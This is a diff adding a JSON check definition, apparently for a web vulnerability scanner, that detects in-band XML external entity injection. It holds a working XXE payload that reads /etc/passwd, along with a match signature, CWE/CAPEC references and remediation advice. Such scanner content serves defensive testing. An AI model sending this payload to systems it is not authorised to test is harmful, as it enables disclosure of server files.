@@ -1,0 +1,23 @@
+{
+  "id": "w4b-xxe-inband-passwd",
+  "bug_class": "xxe",
+  "title": "In-band XML external entity file read (/etc/passwd)",
+  "severity": "High",
+  "applies_when": {
+    "always": true
+  },
+  "insertion_kinds": [
+    "body_whole"
+  ],
+  "oracle": {
+    "kind": "content",
+    "content_payload": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
+    "content_signature": "root:x:0:0:"
+  },
+  "references": [
+    "CWE-611",
+    "CAPEC-201"
+  ],
+  "remediation": "Disable external-entity and DTD processing in every XML parser (secure-processing / no-DOCTYPE). Confirmed only when the target file's distinctive content ('root:x:0:0:') actually appears in the response \u2014 proof the entity was resolved and the file READ, not merely that the payload was reflected.",
+  "payload_family": "external-entity-file-read"
+}
